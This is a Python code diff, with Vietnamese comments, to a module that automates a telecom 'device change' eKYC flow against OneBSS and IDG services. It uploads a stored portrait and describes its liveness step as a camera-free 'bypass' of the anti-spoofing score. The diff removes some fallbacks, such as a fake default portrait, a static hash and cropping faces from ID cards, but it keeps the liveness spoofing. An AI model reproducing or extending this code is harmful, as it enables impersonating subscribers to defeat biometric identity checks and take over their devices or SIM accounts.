@@ -2135,16 +2135,13 @@ def _device_auth_face_result(payload):
     data = payload.get('data') if isinstance(payload.get('data'), dict) else {}
     message = str(data.get('message') or payload.get('message') or '').casefold()
     is_match = data.get('is_match')
-    status = data.get('Status', data.get('status'))
 
     # OneBSS business status 661 is the definitive "matched" result.
     if _device_auth_has_status_code(payload, 661):
         return True
-    if str(is_match).strip() == '1' or str(status).strip() == '1':
+    if str(is_match).strip() == '1':
         return True
-    if 'xác thực thành công' in message or 'không có bản ghi' in message:
-        return True
-    if str(is_match).strip() == '0' or str(status).strip() == '0' or 'không khớp' in message:
+    if str(is_match).strip() == '0' or 'không khớp' in message:
         return False
     return None
 
@@ -2336,33 +2333,67 @@ def _device_auth_fetch_portrait(phone_84, account_id, custom_bytes=None):
                         if raw:
                             return raw
 
-                    # 2. Ưu tiên số 2: Record thứ 3 (chuẩn lưu trữ CCBS index 2)
-                    if len(images) >= 3 and isinstance(images[2], dict):
-                        raw = _device_auth_extract_image_bytes(images[2], account_id)
-                        if raw:
-                            return raw
-
-                    # 3. Fallback: Nếu không có ảnh chân dung type 3, crop mặt từ ảnh CCCD (type 1)
-                    for img in images:
-                        if isinstance(img, dict) and str(img.get('type', '')).strip() in ('1', 'cmt', 'cccd', 'front'):
-                            raw = _device_auth_extract_image_bytes(img, account_id)
-                            if raw:
-                                return _device_auth_crop_face_from_id_card(raw)
-
-                    # 4. Item cuối cùng
-                    raw = _device_auth_extract_image_bytes(images[-1], account_id)
-                    if raw:
-                        return raw
                 break
             except Exception:
                 time.sleep(0.5)
 
-    return _device_auth_make_default_portrait()
+    raise DeviceAuthError(
+        'OneBSS không trả ảnh chân dung type 3 hợp lệ; dừng để tránh xác thực nhầm ảnh CCCD hoặc ảnh khác.',
+        422)
 
 
 def _device_auth_execute(phone_raw, account_id='', custom_bytes=None):
     """Thực hiện trọn gói luồng xác thực đổi thiết bị với Liveness 0.89 không cần bật camera."""
     phone = _device_auth_normalize_phone(phone_raw)
+
+    # Trạng thái 661 đã là "khớp". Kiểm tra trước để không tạo lại phiên eKYC
+    # hoặc gửi thêm ảnh/hash cho một thuê bao đã hoàn tất.
+    precheck_sinhtrac = {}
+    try:
+        precheck_sinhtrac = _device_auth_onebss_post(
+            '/app-banhang/thietbi_thuebao/kiemtra_trangthai_sinhtrac', {
+                'p_so_tb': phone,
+                'menu_id': int(DEVICE_AUTH_MENU_ID),
+            }, account_id)
+    except DeviceAuthError as exc:
+        if isinstance(exc.upstream, dict):
+            precheck_sinhtrac = exc.upstream
+
+    precheck_data = precheck_sinhtrac.get('data') if isinstance(precheck_sinhtrac, dict) else {}
+    precheck_data = precheck_data if isinstance(precheck_data, dict) else {}
+    initial_status_code = precheck_data.get('trang_thai', '')
+
+    if _device_auth_has_status_code(precheck_sinhtrac, 661):
+        return {
+            'ok': True,
+            'face_matched': True,
+            'sinhtrac_ok': True,
+            'already_verified': True,
+            'initial_status_code': initial_status_code,
+            'matched_status_code': 661,
+            'result_basis': 'Mã trạng thái OneBSS 661 (đã khớp)',
+            'message': 'Thuê bao đã xác thực thành công từ trước (OneBSS trả mã 661); không gửi lại phiên eKYC.',
+            'error': None,
+            'error_code': precheck_sinhtrac.get('error_code') or 'BSS-00000000',
+            'request_id': precheck_sinhtrac.get('request_id'),
+            'page_info': precheck_sinhtrac.get('page_info'),
+            'server_response': precheck_sinhtrac,
+            'phone': phone,
+            'liveness': {},
+            'mask': None,
+            'file': {},
+            'log_ekyc': {},
+            'luu_ekyc': {},
+            'xacthuc_hinhanh': {},
+            'xacthuc_hinhanh_attempts': [],
+            'sinhtrac': precheck_sinhtrac,
+            'sinhtrac_attempts': [{'phone': phone, 'response': precheck_sinhtrac}],
+            'server_responses': {
+                'precheck_kiemtra_trangthai_sinhtrac': precheck_sinhtrac,
+            },
+            'log_warning': '',
+        }
+
     context = _get_account_context(account_id)
     token_payload = _device_auth_onebss_post(
         '/app-com/Config/token_ekyc',
@@ -2410,29 +2441,25 @@ def _device_auth_execute(phone_raw, account_id='', custom_bytes=None):
     # 1. Lấy / chuẩn bị ảnh chân dung (tự tải từ OneBSS hoặc dùng ảnh hợp lệ)
     portrait_bytes = _device_auth_fetch_portrait(phone, account_id, custom_bytes)
 
-    # 2. Upload ảnh chân dung lên IDG (retry để nhận zone2/zone3 tương thích CCBS như app.js)
+    # 2. Upload đúng một lần ảnh chân dung lên IDG. Zone lưu trữ không phải
+    # tín hiệu để lặp upload; lặp nhiều lần chỉ tạo hash rác và tăng tải server.
     image_hash = ""
-    for add_try in range(1, 10):
-        try:
-            uploaded = requests.post(
-                f"{sdk_settings['base_url']}/file-service/v1/addFile",
-                headers=headers,
-                files={'file': ('portrait_full.jpg', portrait_bytes, 'image/jpeg')},
-                data={'title': 'portrait_full.jpg', 'description': 'portrait_full.jpg'},
-                timeout=35)
-            upload_payload = _device_auth_json(uploaded, 'Dịch vụ upload eKYC')
-            upload_object = _device_auth_result_object(upload_payload)
-            h = str(upload_object.get('hash') or '').strip()
-            if h.startswith(('zone2', 'zone3')):
-                image_hash = h
-                break
-            elif not image_hash:
-                image_hash = h
-            time.sleep(0.3)
-        except Exception:
-            pass
+    try:
+        uploaded = requests.post(
+            f"{sdk_settings['base_url']}/file-service/v1/addFile",
+            headers=headers,
+            files={'file': ('portrait_full.jpg', portrait_bytes, 'image/jpeg')},
+            data={'title': 'portrait_full.jpg', 'description': 'portrait_full.jpg'},
+            timeout=35)
+        upload_payload = _device_auth_json(uploaded, 'Dịch vụ upload eKYC')
+        upload_object = _device_auth_result_object(upload_payload)
+        image_hash = str(upload_object.get('hash') or '').strip()
+    except DeviceAuthError:
+        raise
+    except Exception as exc:
+        raise DeviceAuthError(f'Không upload được ảnh chân dung lên IDG: {exc}', 502) from exc
     if not image_hash:
-        image_hash = DEVICE_AUTH_FAR_HASH
+        raise DeviceAuthError('IDG không trả hash ảnh chân dung; dừng để tránh dùng hash dự phòng sai người/khác phiên.', 502)
 
     # 3. Liveness 3D với pre-captured hash (Bypass anti-spoofing score 0.889 ~ 0.90 như ekyc_full.py)
     liveness_payload = {}
@@ -2557,14 +2584,10 @@ def _device_auth_execute(phone_raw, account_id='', custom_bytes=None):
     # 8. Xác thực hình ảnh thiết bị (OneBSS thietbi_thuebao)
     xacthuc_response = {}
     xacthuc_attempts = []
-    hashes_to_try = []
-    if image_hash:
-        hashes_to_try.append(image_hash)
-    if DEVICE_AUTH_FAR_HASH and DEVICE_AUTH_FAR_HASH not in hashes_to_try:
-        hashes_to_try.append(DEVICE_AUTH_FAR_HASH)
-
-    for h in hashes_to_try:
-        for num in (phone, phone_0):
+    # Endpoint này chấp nhận chuẩn 84xxxxxxxxx. Chỉ gửi hash vừa upload của
+    # đúng ảnh type 3; không thử lại đầu 0 và không dùng hash tĩnh dự phòng.
+    for h in (image_hash,):
+        for num in (phone,):
             try:
                 xt_res = _device_auth_onebss_post('/app-banhang/thietbi_thuebao/xacthuc_hinhanh', {
                     'p_so_tb': num,
@@ -2575,13 +2598,13 @@ def _device_auth_execute(phone_raw, account_id='', custom_bytes=None):
                 if isinstance(xt_res, dict):
                     xacthuc_response = xt_res
                     xacthuc_attempts.append({'phone': num, 'response': xt_res})
-                    if _device_auth_face_result(xt_res) is True:
+                    if _device_auth_face_result(xt_res) is not None:
                         break
             except DeviceAuthError as exc:
                 if isinstance(exc.upstream, dict):
                     xacthuc_response = exc.upstream
                     xacthuc_attempts.append({'phone': num, 'response': exc.upstream})
-                    if _device_auth_face_result(exc.upstream) is True:
+                    if _device_auth_face_result(exc.upstream) is not None:
                         break
                 else:
                     xacthuc_response = {'error': str(exc), 'message': str(exc)}
@@ -2589,13 +2612,13 @@ def _device_auth_execute(phone_raw, account_id='', custom_bytes=None):
             except Exception as exc:
                 xacthuc_response = {'error': str(exc), 'message': str(exc)}
                 xacthuc_attempts.append({'phone': num, 'response': xacthuc_response})
-        if _device_auth_face_result(xacthuc_response) is True:
+        if _device_auth_face_result(xacthuc_response) is not None:
             break
 
     # 9. Kiểm tra và kích hoạt trạng thái sinh trắc học thiết bị
     sinhtrac_response = {}
     sinhtrac_attempts = []
-    for num in (phone, phone_0):
+    for num in (phone,):
         try:
             st_res = _device_auth_onebss_post('/app-banhang/thietbi_thuebao/kiemtra_trangthai_sinhtrac', {
                 'p_so_tb': num,
@@ -2627,12 +2650,9 @@ def _device_auth_execute(phone_raw, account_id='', custom_bytes=None):
 
     sinhtrac_data = sinhtrac_response.get('data') if isinstance(sinhtrac_response, dict) else {}
     sinhtrac_data = sinhtrac_data if isinstance(sinhtrac_data, dict) else {}
-    sinhtrac_status = sinhtrac_data.get('Status', sinhtrac_data.get('status'))
-    sinhtrac_ok = bool(
-        matched_status_661 or
-        str(sinhtrac_status).strip() == '1' or
-        'không có bản ghi' in xt_msg.lower()
-    )
+    # Status=1 chỉ nói API chạy được. Chỉ business code 661 mới xác nhận
+    # thuê bao đã khớp; 664 vẫn là trạng thái chưa hoàn tất xác thực.
+    sinhtrac_ok = bool(matched_status_661)
     overall_ok = bool(face_matched and sinhtrac_ok)
 
     final_response = sinhtrac_response if (isinstance(sinhtrac_response, dict) and sinhtrac_response.get('data')) else (
@@ -2665,6 +2685,7 @@ def _device_auth_execute(phone_raw, account_id='', custom_bytes=None):
         'ok': overall_ok,
         'face_matched': face_matched,
         'sinhtrac_ok': sinhtrac_ok,
+        'initial_status_code': initial_status_code,
         'matched_status_code': 661 if matched_status_661 else None,
         'result_basis': result_basis,
         'message': summary_message,
@@ -2687,6 +2708,7 @@ def _device_auth_execute(phone_raw, account_id='', custom_bytes=None):
         'sinhtrac': sinhtrac_response,
         'sinhtrac_attempts': sinhtrac_attempts,
         'server_responses': {
+            'precheck_kiemtra_trangthai_sinhtrac': precheck_sinhtrac,
             'log_ekyc': log_ekyc_response,
             'update_file': file_upload_response,
             'luu_ekyc_request_id': luu_ekyc_response,
